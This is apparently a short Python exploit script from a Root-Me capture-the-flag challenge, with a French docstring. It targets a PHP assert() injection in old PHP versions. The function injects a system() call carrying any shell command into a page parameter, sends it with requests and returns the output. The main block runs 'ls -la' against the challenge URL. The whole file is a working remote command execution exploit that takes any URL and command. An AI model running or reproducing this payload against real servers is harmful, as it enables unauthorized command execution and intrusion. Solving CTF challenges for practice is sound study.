"""
Script perettant d'exploiter une injection dans la fonction assert de PHP < 5.2
"""
import requests
from models.webRessource import headers_base as headers
import urllib.parse


def php_assert_exploit(url, command):
    payload = """'.system("{}").'""".format(command)
    return requests.get(url + urllib.parse.quote(payload), headers=headers).text


if __name__ == "__main__":
    print(php_assert_exploit("http://challenge01.root-me.org/web-serveur/ch47/?page=", "ls -la"))
